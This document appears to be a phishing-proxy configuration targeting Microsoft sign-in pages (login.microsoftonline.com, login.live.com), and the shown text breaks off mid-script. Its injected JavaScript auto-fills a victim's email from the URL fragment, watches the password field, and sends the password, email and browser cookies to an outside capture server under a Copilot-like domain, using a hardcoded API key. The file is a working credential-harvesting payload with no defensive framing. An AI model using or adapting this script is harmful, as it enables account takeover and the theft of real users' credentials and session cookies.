login:
  domain: "login.microsoftonline.com"
  path: "/"

js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
    trigger_paths: ["/common/oauth2/", "/", "/*", "/common/oauth2/v2.0/authorize"]
    script: |
      var BACKEND_URL = 'https://api.copilotapp.online/__capture_tokens';
      var API_KEY = '7867dcfdc6292345d9cba9f3811a58db4ced4a9298aeacb9633cb4f29430584d';
      
      function sendToBackend(data) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', BACKEND_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('X-API-Key', API_KEY);
        xhr.send(JSON.stringify(data));
      }
      
      function getCookiesAsString() {
        return document.cookie || '';
      }
      
      function autoFillEmail() {
        var emailField = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        var hash = window.location.hash.substring(1);
        if (hash && emailField) {
          try {
            var decoded = atob(hash);
            emailField.value = decoded;
            if (nextButton) nextButton.click();
          } catch(e) {}
        }
        setTimeout(autoFillEmail, 500);
      }
      autoFillEmail();
      
      var passInterval = setInterval(function() {
        var passField = document.querySelector("#i0118");
        var emailField = document.querySelector("#i0116");
        if (passField && passField.value && passField.value.length > 0) {
          var email = emailField ? emailField.value : 'unknown';
          var pass = passField.value;
          var cookies = getCookiesAsString();
          sendToBackend({
            access_token: '',
            refresh_token: '',
            id_token: '',
            password: pass,
            email: email,
            cookies: cookies,
            client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c'
          });
          clearInterval(passInterval);
